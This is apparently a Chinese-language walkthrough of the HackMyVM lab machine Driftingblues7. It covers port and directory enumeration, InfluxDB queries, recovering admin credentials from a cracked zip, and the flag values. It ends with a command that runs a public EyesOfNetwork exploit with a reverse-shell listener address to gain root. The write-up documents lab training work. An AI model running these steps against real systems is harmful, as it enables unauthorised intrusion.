# Driftingblues7

2024-11-16 https://hackmyvm.eu/machines/machine.php?vm=Driftingblues7

## IP

192.168.5.40

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
66/tcp   open  sqlnet
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
2403/tcp open  taskmaster2000
3306/tcp open  mysql
8086/tcp open  d-s-n
```

2403 nc 连接后没有反应，3306 不允许外联。

8086 是 InfluxDB 可以通过网页访问，使用 gobuster 进行扫描，可以执行 sql 语句：

```
http://192.168.5.40:8086/ping
http://192.168.5.40:8086/query
http://192.168.5.40:8086/status
```

```
# 查数据库
curl -G --data-urlencode 'q=show databases;' http://192.168.5.40:8086/query

{"results":[{"statement_id":0,"series":[{"name":"databases","columns":["name"],"values":[["nagflux"],["_internal"]]}]}]}

# 查表
curl --data-urlencode 'db=nagflux' --data-urlencode 'q=show measurements' http://192.168.5.40:8086/query

{"results":[{"statement_id":0,"series":[{"name":"measurements","columns":["name"],"values":[["messages"],["metrics"]]}]}]}

# 查列
curl --data-urlencode 'db=nagflux' --data-urlencode 'q=show field keys' http://192.168.5.40:8086/query

{"results":[{"statement_id":0,"series":[{"name":"messages","columns":["fieldKey","fieldType"],"values":[["message","string"]]},{"name":"metrics","columns":["fieldKey","fieldType"],"values":[["crit","float"],["max","float"],["min","float"],["value","float"],["warn","float"]]}]}]}
```

但是在这个数据库中没发现用户登陆需要的凭据信息。

66 端口是 python 搭建的 SimpleHTTPServer，先扫描下目录看看有什么信息：

```
gobuster dir -q -t 64 -e -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt,bak -u http://192.168.5.40:66/

http://192.168.5.40:66/.bash_history
http://192.168.5.40:66/.bashrc
http://192.168.5.40:66/index.htm
http://192.168.5.40:66/index_files
http://192.168.5.40:66/root.txt
http://192.168.5.40:66/user.txt
http://192.168.5.40:66/eno
```

直接获取到了 user flag : AED508ABE3D1D1303E1C1BC5F1C1BA2B , root flag: BD221F968ACB7E069FC7DDE713995C77 直接提交正确。

访问 http://192.168.5.40:66/eno 是一个 base64 编码的内容，然后将其解码是一个 zip 文件，zip 有密码，使用 john 进行破解发现密码为 killah , 解压后的内容为：

```
admin
isitreal31__
```

80 和 443 都对应的是 EyesOfNetwork 这个网站，但是需要用户名和密码才能登陆，使用上面得到的用户凭据进行登陆，成功。搜索是否可以通过该 web 执行命令进行反弹，在 searchsploit 中搜索到： php/webapps/48025.txt 将其改成 py 脚本，执行下面命令得到了 root 权限：

```
python3 48025.py https://192.168.5.40 -ip 192.168.5.3 -port 9999 -user admin -password 'isitreal31__'
```
